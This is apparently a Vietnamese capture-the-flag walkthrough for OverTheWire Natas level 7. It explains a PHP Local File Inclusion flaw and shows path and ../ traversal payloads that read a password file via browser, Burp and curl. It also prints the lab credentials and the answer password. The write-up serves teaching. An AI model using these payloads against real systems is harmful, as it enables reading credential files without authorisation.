# Level 7 -> Level 8

Home About

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->

---

## 1. THÔNG TIN TRUY CẬP (DÙNG PASSWORD TÌM ĐƯỢC TỪ NATAS 6)

- **URL**: `http://natas7.natas.labs.overthewire.org`
- **Username**: `natas7`
- **Password**: `B1szg95UcTnrzwnF3i3TzYHlyYh8iBV0`
- **Giao thức xác thực**: HTTP Basic Authentication

---

## 2. THỬ THÁCH & KIẾN THỨC NỀN TẢNG CỦA LEVEL 7

### Thử thách
Giao diện trang chủ chỉ có 2 đường link điều hướng: **Home** và **About**.
Khi bấm vào từng liên kết, thanh địa chỉ URL thay đổi:
- Nhấn Home: `index.php?page=home`
- Nhấn About: `index.php?page=about`

Khi mở mã nguồn HTML (`Ctrl + U`), ta bắt gặp một gợi ý (hint) quan trọng:
```html
<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
```

### Manh mối & Kiến thức cốt lõi: Lỗ hổng Local File Inclusion (LFI)

1. **Cơ chế nạp tệp động trong PHP**:
   - Ở phía máy chủ, lập trình viên thường tái sử dụng layout chung và chỉ thay đổi phần thân trang bằng cách lấy tham số `page` từ URL rồi nạp vào qua hàm `include()`:
     ```php
     include($_GET['page']);
     ```
   - Khi người dùng gửi `page=home`, mã sẽ thực thi `include("home");`.

2. **Lỗ hổng Local File Inclusion (LFI) là gì?**:
   - LFI xảy ra khi ứng dụng web nhận đường dẫn tệp tin từ người dùng và đưa trực tiếp vào hàm nạp tệp của máy chủ mà **không kiểm tra hay giới hạn (whitelist)** các tệp được phép mở.
   - Vì hàm `include()` trong PHP có khả năng đọc bất kỳ tệp tin nào có trên hệ thống mà tiến trình web server có quyền truy cập, kẻ tấn công có thể thay đổi giá trị tham số `page` để đọc các tệp hệ thống nhạy cảm (như `/etc/passwd`, file log, mã nguồn PHP hoặc các tệp lưu mật khẩu).

3. **Hai kiểu truyền đường dẫn khi khai thác LFI**:
   - **Đường dẫn tuyệt đối (Absolute Path)**: Bắt đầu từ thư mục gốc `/` của hệ điều hành Linux:
     ```text
     /etc/natas_webpass/natas8
     ```
   - **Đường dẫn tương đối qua Directory Traversal**: Sử dụng chuỗi `../` (đi ngược về thư mục cha) nhiều lần để thoát khỏi thư mục web về thư mục gốc hệ thống:
     ```text
     ../../../../etc/natas_webpass/natas8
     ```

---

## 3. CÔNG CỤ CẦN DÙNG

- **Trình duyệt Web**: Thay đổi trực tiếp tham số trên thanh địa chỉ URL.
- **Burp Suite**: Can thiệp tham số GET qua Repeater hoặc Proxy Intercept.
- **Dòng lệnh CLI (cURL)**: Gửi request chứa payload LFI qua terminal.

---

## 4. CÁC BƯỚC THỰC HIỆN ĐỂ LẤY PASSWORD LEVEL 8

### Cách 1: Thao tác trực tiếp trên Trình duyệt

- **Bước 1**: Mở trình duyệt và truy cập đường dẫn:
  ```text
  http://natas7.natas.labs.overthewire.org
  ```
  Đăng nhập với tài khoản:
  - **User**: `natas7`
  - **Pass**: `B1szg95UcTnrzwnF3i3TzYHlyYh8iBV0`

- **Bước 2**: Nhấn **`Ctrl + U`** để kiểm tra mã nguồn, tìm thấy gợi ý:
  ```html
  <!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
  ```

- **Bước 3**: Nhấp vào liên kết **Home** hoặc **About**, quan sát cấu trúc tham số `page=` trên thanh địa chỉ.

- **Bước 4**: Thay thế giá trị của tham số `page` bằng đường dẫn tệp mật khẩu:
  ```text
  http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
  ```

  *(Cách khác tương đương sử dụng Directory Traversal)*:
  ```text
  http://natas7.natas.labs.overthewire.org/index.php?page=../../../../etc/natas_webpass/natas8
  ```

- **Bước 5**: Nhấn Enter. Máy chủ sẽ đọc nội dung tệp `/etc/natas_webpass/natas8` và in chuỗi mật khẩu trực tiếp lên màn hình trang web!

---

### Cách 2: Sử dụng Burp Suite

- **Bước 1**: Mở trình duyệt của Burp Suite (`Open browser`) và truy cập đường dẫn:
  ```text
  http://natas7.natas.labs.overthewire.org
  ```
  Đăng nhập với tài khoản:
  - **User**: `natas7`
  - **Pass**: `B1szg95UcTnrzwnF3i3TzYHlyYh8iBV0`

- **Bước 2**: Quay lại Burp Suite, vào tab **`Proxy`** $\rightarrow$ **`HTTP history`** $\rightarrow$ Click chuột phải vào request `natas7` (Status `200`) $\rightarrow$ chọn **`Send to Repeater`** (`Ctrl + R`).
- **Bước 3**: Tại tab **`Repeater`**, sửa dòng đầu tiên của gói tin từ:
  ```http
  GET /index.php?page=home HTTP/1.1
  ```
  thành:
  ```http
  GET /index.php?page=/etc/natas_webpass/natas8 HTTP/1.1
  ```
- **Bước 4**: Bấm nút màu cam **`Send`**. Khung **Response** bên phải sẽ trả về mật khẩu của `natas8`.

---

### Cách 3: Sử dụng dòng lệnh PowerShell / Terminal với cURL

Gửi HTTP request trực tiếp với tham số payload LFI:

```powershell
curl.exe -s -u natas7:B1szg95UcTnrzwnF3i3TzYHlyYh8iBV0 "http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8"
```

---

## 5. KẾT QUẢ / MẬT KHẨU LEVEL 8

```text
Password natas8: [ugXL95KQmUAJJj6bMezOlBNDyI9Imwkc]
```

